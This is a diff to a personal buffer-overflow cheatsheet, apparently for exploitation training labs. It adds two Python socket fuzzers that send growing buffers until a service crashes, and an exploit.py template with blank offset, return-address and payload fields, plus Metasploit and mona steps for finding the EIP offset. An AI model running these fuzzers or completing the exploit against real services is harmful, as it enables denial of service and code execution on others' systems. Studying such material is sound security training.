@@ -19,14 +19,100 @@ description: "Buffer Overflow personnal cheatsheet"
 ### Fuzzing :
 
 - fuzzer.py / fuzzer2.py -> until app crash
+
+```
+#fuzzer.py
+
+import socket, time, sys
+
+ip = "IP"
+port = PORT
+timeout = 5
+
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        s.recv(1024)
+        print("Fuzzing with %s bytes" % len(string))
+        s.send(string + "\r\n")
+        s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
+```
+
+```
+#fuzzer2.py
+
+import socket
+
+target_ip = "IP"
+target_port = PORT
+
+payload = 1000 * "A"
+
+try: 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip,target_port))
+    s.send(payload)
+    print "[+] " + str(len(payload)) + " Bytes Sent"
+except:
+    print "[-] Crashed"
+```
+
 - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l SIZE -> SIZE higher than crash offset
 
 ### Crash Replication & Controlling EIP :
 
 - modify payload variable by pattern (exploit.py) 
+
+  ```
+  #exploit.py
+  
+  import socket
+  
+  ip = "IP"
+  port = PORT
+  
+  prefix = ""
+  offset = 0
+  overflow = "A" * offset
+  retn = ""
+  padding = ""
+  payload = ""
+  postfix = ""
+  
+  buffer = prefix + overflow + retn + padding + payload + postfix
+  
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+  try:
+      s.connect((ip, port))
+      print("Sending evil buffer...")
+      s.send(buffer + "\r\n")
+      print("Done!")
+  except:
+      print("Could not connect.")
+  ```
+
+  
+
 - !mona findmsp -distance SIZE -> SIZE same as pattern
+
 - EIP contains normal pattern : ... (offset XXXX) -> get the offset, modify offset variable (exploit.py)
+
 - modify retn variable by "BBBB", remove payload
+
 - Re-run exploit.py -> EIP should be "BBBB"
 
 ### Finding Bad Characters :
